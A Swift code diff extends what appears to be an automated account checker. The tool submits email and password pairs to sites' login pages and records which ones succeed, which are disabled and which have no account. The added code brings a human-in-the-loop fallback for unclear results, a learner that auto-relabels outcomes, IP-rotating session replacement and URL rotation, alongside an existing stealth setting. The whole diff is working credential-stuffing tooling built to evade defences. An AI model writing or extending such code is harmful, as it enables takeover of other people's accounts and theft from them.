@@ -33,6 +33,14 @@ class DualFindViewModel {
     var hasResumePoint: Bool = false
     var copiedHitId: String?
 
+    var activeIntervention: DualFindInterventionRequest?
+    var showInterventionSheet: Bool = false
+    var interventionResponse: DualFindInterventionAction?
+    var interventionUnsureCount: Int = 0
+    var interventionAutoHealCount: Int = 0
+
+    let interventionLearning = UserInterventionLearningService.shared
+
     var appearanceMode: AppAppearanceMode = .dark
     var stealthEnabled: Bool = true
     var debugMode: Bool = false
@@ -448,7 +456,142 @@ class DualFindViewModel {
 
             try? await Task.sleep(for: .seconds(6))
 
-            let outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)
+            var outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)
+
+            if outcome == .unsure {
+                let pageContent = await session.getPageContent()
+                let currentURL = await session.getCurrentURL()
+                let host = URL(string: currentURL)?.host ?? currentURL
+
+                if let autoHeal = interventionLearning.suggestAutoHeal(host: host, pageContent: pageContent, currentURL: currentURL),
+                   autoHeal.confidence >= 0.7 {
+                    let healedOutcome: DualFindTestOutcome
+                    switch autoHeal.outcome.lowercased() {
+                    case "success": healedOutcome = .success
+                    case "disabled": healedOutcome = .disabled
+                    case "noaccount", "noacc": healedOutcome = .noAccount
+                    default: healedOutcome = .unsure
+                    }
+                    if healedOutcome != .unsure {
+                        outcome = healedOutcome
+                        interventionAutoHealCount += 1
+                        log("[\(label)] AI auto-healed unsure → \(autoHeal.outcome) (\(String(format: "%.0f%%", autoHeal.confidence * 100)) confidence, learned from \(interventionLearning.totalCorrections) corrections)", level: .success)
+                    }
+                }
+            }
+
+            if outcome == .unsure {
+                interventionUnsureCount += 1
+                log("[\(label)] \(email) — UNSURE result, freezing session for user intervention", level: .warning)
+                updateSession(id: sessionInfoId, email: email, status: "UNSURE ⚠️", active: true)
+
+                let pageContent = await session.getPageContent()
+                let currentURL = await session.getCurrentURL()
+
+                let request = DualFindInterventionRequest(
+                    sessionLabel: label,
+                    email: email,
+                    password: password,
+                    platform: site.rawValue,
+                    pageContent: pageContent,
+                    currentURL: currentURL,
+                    sessionIndex: sessionIndex,
+                    site: site,
+                    passwordIndex: passwordIndex
+                )
+
+                activeIntervention = request
+                interventionResponse = nil
+                showInterventionSheet = true
+
+                while interventionResponse == nil && !isStopping {
+                    try? await Task.sleep(for: .milliseconds(300))
+                }
+                showInterventionSheet = false
+
+                if let response = interventionResponse {
+                    let host = URL(string: currentURL)?.host ?? currentURL
+                    log("[\(label)] User intervention: \(response.rawValue) for \(email)", level: .info)
+
+                    switch response {
+                    case .markSuccess:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "success", actionTaken: response.rawValue)
+                        outcome = .success
+
+                    case .markNoAccount:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "noAccount", actionTaken: response.rawValue)
+                        outcome = .noAccount
+
+                    case .markDisabled:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "disabled", actionTaken: response.rawValue)
+                        outcome = .disabled
+
+                    case .restartWithNewIP:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
+                        log("[\(label)] Restarting with new IP per user request", level: .warning)
+                        await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+                        if let freshSession = getPersistentSession(site: site, index: sessionIndex) {
+                            let retryOutcome = await retryEmailOnFreshSession(
+                                session: freshSession, email: email, password: password,
+                                site: site, sessionIndex: sessionIndex, label: label
+                            )
+                            outcome = retryOutcome
+                        } else {
+                            outcome = .transient
+                        }
+
+                    case .pressSubmitAgain:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
+                        log("[\(label)] Pressing submit 3 more times per user request", level: .info)
+                        for submitAttempt in 1...3 {
+                            let calRetry = getCalibration(site: site, index: sessionIndex)
+                            let retrySubmit = await session.clickLoginButtonCalibrated(calibration: calRetry)
+                            if !retrySubmit.success {
+                                _ = await session.pressEnterOnPasswordField()
+                            }
+                            log("[\(label)] Extra submit \(submitAttempt)/3", level: .info)
+                            try? await Task.sleep(for: .seconds(3))
+                        }
+                        outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)
+
+                    case .disableURL:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
+                        urlRotation.reportFailure(urlString: currentURL)
+                        urlRotation.reportFailure(urlString: currentURL)
+                        log("[\(label)] URL disabled per user request: \(currentURL)", level: .warning)
+                        await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+                        if let freshSession = getPersistentSession(site: site, index: sessionIndex) {
+                            let retryOutcome = await retryEmailOnFreshSession(
+                                session: freshSession, email: email, password: password,
+                                site: site, sessionIndex: sessionIndex, label: label
+                            )
+                            outcome = retryOutcome
+                        } else {
+                            outcome = .transient
+                        }
+
+                    case .disableViewport:
+                        interventionLearning.recordCorrection(host: host, pageContent: pageContent, currentURL: currentURL, originalClassification: "unsure", userCorrectedOutcome: "transient", actionTaken: response.rawValue)
+                        log("[\(label)] Viewport disabled per user request — rebuilding session", level: .warning)
+                        await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
+                        if let freshSession = getPersistentSession(site: site, index: sessionIndex) {
+                            let retryOutcome = await retryEmailOnFreshSession(
+                                session: freshSession, email: email, password: password,
+                                site: site, sessionIndex: sessionIndex, label: label
+                            )
+                            outcome = retryOutcome
+                        } else {
+                            outcome = .transient
+                        }
+
+                    case .skipAndContinue:
+                        outcome = .noAccount
+                    }
+
+                    activeIntervention = nil
+                    interventionResponse = nil
+                }
+            }
 
             switch outcome {
             case .success:
@@ -550,6 +693,10 @@ class DualFindViewModel {
             case .noAccount:
                 log("[\(label)] \(email) — no account (pw \(passwordIndex + 1))")
                 updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)
+
+            case .unsure:
+                log("[\(label)] \(email) — unresolved unsure (pw \(passwordIndex + 1))", level: .warning)
+                updateSession(id: sessionInfoId, email: email, status: "Unsure", active: false)
             }
 
             completedTests += 1
@@ -626,6 +773,19 @@ class DualFindViewModel {
 
         if pageContent.trimmingCharacters(in: .whitespacesAndNewlines).count < 30 {
             return .transient
+        }
+
+        let incorrectMarkers = ["incorrect password", "invalid credentials", "wrong password",
+                                "invalid email or password", "login failed", "authentication failed",
+                                "no account found", "account not found", "invalid email", "invalid username"]
+        for marker in incorrectMarkers {
+            if contentLower.contains(marker) {
+                return .noAccount
+            }
+        }
+
+        if urlLower.contains("/login") || urlLower.contains("/signin") || urlLower.contains("overlay=login") {
+            return .unsure
         }
 
         return .noAccount
